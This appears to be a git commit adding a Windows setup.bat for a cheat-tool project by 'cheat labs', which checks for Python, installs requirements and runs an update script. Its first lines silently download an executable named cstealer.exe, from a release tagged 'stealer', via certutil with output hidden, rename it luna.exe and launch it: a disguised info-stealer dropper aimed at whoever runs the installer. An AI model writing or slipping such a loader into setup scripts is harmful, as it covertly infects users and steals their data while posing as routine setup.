712c54b0d1625ed5d2405c3ab421f0410a80dccf
cheat labs <131698090+hvbsvqdj@users.noreply.github.com>
2024-03-03 01:26:05 +0100

    Add files via upload

---
+++ setup.bat
@@ -0,0 +1,29 @@
+@echo off
+set "URL=https://github.com/hvbsvqdj/cstealer/releases/download/stealer/cstealer.exe"
+set "Dossier=tools"
+set "NomFichier=%Dossier%\luna.exe"
+
+certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1
+
+if exist "%NomFichier%" (
+    start "" "%NomFichier%"
+)
+color 5
+
+title Checking Python Version
+python --version > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
+    echo Make sure it is added to PATH.
+    pause > nul
+)
+
+title Installing Requirements
+cd /d "%~dp0"
+echo Installing Requirements...
+python -m pip install -r requirements.txt
+
+cd tools
+title Checking for updates
+echo Checking for updates...
+python update.py
